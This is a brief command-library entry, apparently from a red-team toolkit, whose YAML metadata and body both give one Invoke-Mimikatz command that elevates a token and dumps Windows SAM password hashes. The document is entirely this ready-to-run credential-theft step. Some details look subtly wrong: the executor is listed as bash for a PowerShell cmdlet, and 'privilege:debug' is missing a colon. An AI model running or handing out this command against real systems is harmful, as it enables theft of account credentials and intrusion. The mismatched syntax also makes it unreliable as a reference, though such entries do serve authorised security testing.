---
id: 390a1971-54d4-4016-98a6-f20bccf1edfd
name: Dump SAM hashes using mimikatz
type: command
executor: bash
data: 'Invoke-Mimikatz -Command ''"privilege:debug" "token::elevate" "lsadump::sam"
  "exit"''

  '
output: null
created_at: '2020-07-15T19:05:44.362207+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Dump SAM hashes using mimikatz

```bash
Invoke-Mimikatz -Command '"privilege:debug" "token::elevate" "lsadump::sam" "exit"'

```
